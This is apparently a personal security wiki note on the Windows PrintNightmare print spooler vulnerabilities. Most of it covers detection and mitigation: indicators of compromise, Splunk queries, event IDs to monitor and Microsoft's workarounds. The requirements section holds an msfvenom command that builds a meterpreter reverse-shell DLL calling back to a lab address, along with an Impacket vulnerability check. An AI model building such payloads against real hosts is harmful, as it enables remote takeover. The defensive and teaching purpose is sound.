# PrintNightmare


Microsoft described this vulnerability: *A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights".*

A Print Spooler Service is one of many [[Windows-Services]]. It is defined by Microsoft as: *"The [print spooler](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_c6bde257-38a5-43bb-8d0e-204e226b3655) service is a service that is running on each computer that participates in the Print Services system. The print spooler service implements the [print client](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_3b2da3d1-c159-4399-a6dd-dfd5f76fa2f5) and [print server](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_59fb3ddc-63cf-45df-8a90-46a6af9e00cb) roles, by enabling each participating system to act as a print client, administrative client, or print server for the Print Services system."*

[CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) and [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) are related to each other, but differ regardless of being categorized as **Windows Print Spooler Remote Code Execution Vulnerability**.

As [Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) states in the FAQ, the PrintNightmare (CVE-2021-34527) vulnerability "_is similar but distinct from the vulnerability that is assigned CVE-2021-1675._ _The attack vector is different as well."_

What did Microsoft mean by the attack vector? To answer this question, let's look into the differences between the two vulnerabilities and append the timeline of events. 

Per [Microsoft's](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) definition, PrintNightmare vulnerability is _"a remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could **run arbitrary code** with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights."._

CVE Score of 8 for both, made more  by public PoC, Print Spooler is enabled by DEFAULT on DC with SYSTEM privileges and can be used over a network.

#### READ!!!

- Will be done in the next two weeks! Thank you for patience 

-   [PrintNightmare Network Analysis | JUMPSEC LABS](https://labs.jumpsec.com/printnightmare-network-analysis/)
-   [From Lares Labs: Detection & Remediation Information for CVE-2021-1675 & CVE-2021-34527](https://github.com/LaresLLC/CVE-2021-1675)
-   [PrintNightmare (CVE-2021-1675 and CVE 2021-34527) Explained](https://www.blumira.com/cve-2021-1675/)


#### Requirements

To exploit the CVE-2021-1675 vulnerability requires:
- Direct or local access to the machine to use a malicious DLL file to escalate privileges.
To exploit the CVE-2021-34527 vulnerability requires:
- Connection to remotely inject the malicious DLL file.

Tools like:
- [[Impacket-Cheatsheet]]
	- `smbserver` to host exploit 
	- `rpcdump @$ip | egrep 'MSPRN|MS-PAR'` to test if target `$ip` is vulnerable
- [THM version of CVE-2021-1675](https://github.com/tryhackme/CVE-2021-1675) and [THM version of Impacket](https://github.com/tryhackme/impacket.git) - here for compatibility and highlight some of my sources.
- Payload - Beacon or Reverse Shell
```ruby
# MSFvenom payload are commonly signatured by AV and EDR
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll 
```

#### IoC

[Sygnia](https://www.sygnia.co/demystifying-the-printnightmare-vulnerability) shared some advanced threat hunting tips to detect PrintNightmare:  

- Search for the **spoolsv.exe** process launching **rundll32.exe** as a child process without any command-line arguments
- Considering the usage of the **pcAddPrinterDriverEx()** function, you will mostly find the malicious DLL dropped into one of these folders `%WINDIR%\system32\spool\drivers\x64\3\` folder along with DLLs that were loaded afterward from `%WINDIR%\system32\spool\drivers\x64\3\Old\` (You should proactively monitor the folders for any unusual DLLs)
- Hunt for suspicious **spoolsv.exe** child processes (**cmd.exe**, **powershell.exe**, etc.)
- The attacker might even use **Mimikatz** to perform the attack, in this case, a print driver named ‘**QMS 810**’ will be created. This can be detected by logging the registry changes (e.g., **Sysmon ID 13**).    
- Search for DLLs that are part of the proof-of-concept codes that were made public, such as **MyExploit.dll**, **evil.dll**, **addCube.dll**, **rev.dll**, **rev2.dll**, **main64.dll**, **mimilib.dll**. If they're present on the endpoint, you can find them with **Event ID 808** in **Microsoft-Windows-PrintService**.

[[Splunk]] detection queries:

**Identifies Print Spooler adding a new Printer Driver:**  
```c
source="WinEventLog:Microsoft-Windows-PrintService/Operational" 
EventCode=316 category = "Adding a printer driver" Message = "*kernelbase.dll,*" Message = "*UNIDRV.DLL,*" Message = "*.DLL.*" 
| stats count min(_time) as firstTime max(_time) as lastTime by OpCode EventCode ComputerName Message 
```
**Detects spoolsv.exe with a child process of rundll32.exe:**
```c
| tstats count min(_time) as firstTime max(_time) as lastTime from 
datamodel=Endpoint.Processes where 
Processes.parent_process_name=spoolsv.exe 
Processes.process_name=rundll32.exe by Processes.dest Processes.user 
Processes.parent_process Processes.process_name Processes.process 
Processes.process_id Processes.parent_process_id
```
**Suspicious rundll32.exe instances without any command-line arguments:**
```c
| tstats count FROM datamodel=Endpoint.Processes where 
Processes.process_name=spoolsv.exe by _time Processes.process_id Processes.process_name Processes.dest 
| rename "Processes.*" as * 
| join process_guid _time 
    [| tstats count min(_time) as firstTime max(_time) as lastTime FROM datamodel=Endpoint.Filesystem where 
Filesystem.file_path="*\\spool\\drivers\\x64\\*" Filesystem.file_name="*.dll" by _time 
Filesystem.dest Filesystem.file_create_time Filesystem.file_name Filesystem.file_path 
    | rename "Filesystem.*" as * 
    | fields _time dest file_create_time file_name file_path process_name process_path process] 
| dedup file_create_time 
| table dest file_create_time, file_name, file_path, process_name
```
**Detects when a new printer plug-in has failed to load:**  
```c
source="WinEventLog:Microsoft-Windows-PrintService/Admin" ((ErrorCode="0x45A" (EventCode="808" OR EventCode="4909")) 
OR ("The print spooler failed to load a plug-in module" OR "\\drivers\\x64\\")) 
  | stats count min(_time) as firstTime max(_time) as lastTime by OpCode EventCode ComputerName Message
```

## Detection

[[Windows-Events-To-Monitor]] :
-  `Microsoft-Windows-PrintService/Admin` 
	-  Event ID **808** - A security event source has attempted to register (can detect unsigned drivers and malicious DLLs loaded by spoolsv.exe)
-  `Microsoft-Windows-PrintService/Operational`
	- Event ID **811** - Logs the information regarding failed operations. The event will provide information about the full path of the dropped DLL.
	- Event ID **316** - look for "Printer driver *filenamehere* for Windows x64 Version-3 was added or updated. Files:- UNIDRV.DLL, AddUser.dll, AddUser.dll. No user action is required.”
-   `Microsoft-Windows-SMBClient/Security`
	- (Event ID **31017**) - This Event ID can also be used to detect unsigned drivers loaded by spoolsv.exe.
-  `Windows System` (Event ID **7031)** - Service Stop Operations (This event ID will show you unexpected termination of print spooler service).
- Registry Changes Sysmon ID 13

[[Sysinterals-Sysmon]] [[Sysmon-Events]]:
- `Microsoft-Windows-Sysmon/Operational` (Event ID **3**) - Network connection (Look for suspicious ports)
- `Microsoft-Windows-Sysmon/Operational` (Event ID **11**) - `FileCreate` (File creation events are being logged,  you can look for loaded DLLs in the Print Spooler’s driver directory: `C:\Windows\System32\spool\drivers\x64\3`
- `Microsoft-Windows-Sysmon/Operational` (Event IDs **23**, **26**) - `FileDelete` (You can hunt for deleted malicious DLLs)

Packet Analysis - [[Wireshark]] or similar
- The Attack attempt to add a printer driver using [DCE/RPC commands](https://wiki.wireshark.org/DCE/RPC) `RpcAddPrinterDriver` or with `RpcAddPrinterDriverEx`.
	- RPC traffic - 
	- `RpcAddPrinterDriver` or `RpcAddPrinterDriverEx` commands


## Mitigation

[Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) provided the steps to detect if Print Spooler service is enabled and how to disable them:
1. **Determine if the Print Spooler service is running**
	- Run the following in Windows PowerShell: `Get-Service -Name Spooler`
		- If the Print Spooler is running or if the service is not set to disabled, select one of the following options to either disable the Print Spooler service, or to Disable inbound remote printing through Group Policy:
2. **Option 1 - Disable the Print Spooler service**
	- If disabling the Print Spooler service is appropriate for your enterprise, use the following PowerShell commands:
		- `Stop-Service -Name Spooler -Force`
		- `Set-Service -Name Spooler -StartupType Disabled`
	- **Impact of workaround** Disabling the Print Spooler service disables the ability to print both locally and remotely.
3. **Option 2 - Disable inbound remote printing through Group Policy**
	- You can also configure the settings via Group Policy as follows:
		- Computer Configuration / Administrative Templates / Printers
		- Disable the “Allow Print Spooler to accept client connections:” policy to block remote attacks.
			- You must restart the Print Spooler service for the group policy to take effect.
		- **Impact of workaround** This policy will block the remote attack vector by preventing inbound remote printing operations. The system will no longer function as a print server, but local printing to a directly attached device will still be possible.
For more information see: [Use Group Policy settings to control printers](https://docs.microsoft.com/en-us/troubleshoot/windows-server/printing/use-group-policy-to-control-ad-printer).
- [THM notes](): *"Remember that for the group policy to take effect across the domain, or even the local machine, you need to issue a `gpupdate /force` command."*

The [security update](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) for Windows Server 2012, Windows Server 2016, and Windows 10, Version 1607 have been released by Microsoft on July 7, 2021. *"In addition to installing the updates, in order to secure your system, you must confirm that the following registry settings are set to 0 (zero) or are not defined (**Note**: These registry keys do not exist by default, and therefore are already at the secure setting.), also that your Group Policy setting are correct (see FAQ):"* 
-   `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint`
-   `NoWarningNoElevationOnInstall = 0 (DWORD)` or not defined (default setting)
-   `UpdatePromptSettings = 0 (DWORD)` or not defined (default setting)

**Having NoWarningNoElevationOnInstall set to 1 makes your system vulnerable by design.**

## References

[Print spooler Microsoft Documentation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_c6bde257-38a5-43bb-8d0e-204e226b3655)  
[Print client Microsoft Documentation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_3b2da3d1-c159-4399-a6dd-dfd5f76fa2f5) 
[Print server Microsoft Documentation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_59fb3ddc-63cf-45df-8a90-46a6af9e00cb) 
[CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) 
[CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
[Microsoft's PrintNightmare Definition](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) 
[Microsoft's description of CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) 
[THM PrintNight Room 1 - Learn the Vulberability](https://tryhackme.com/room/printnightmarehpzqlp8)
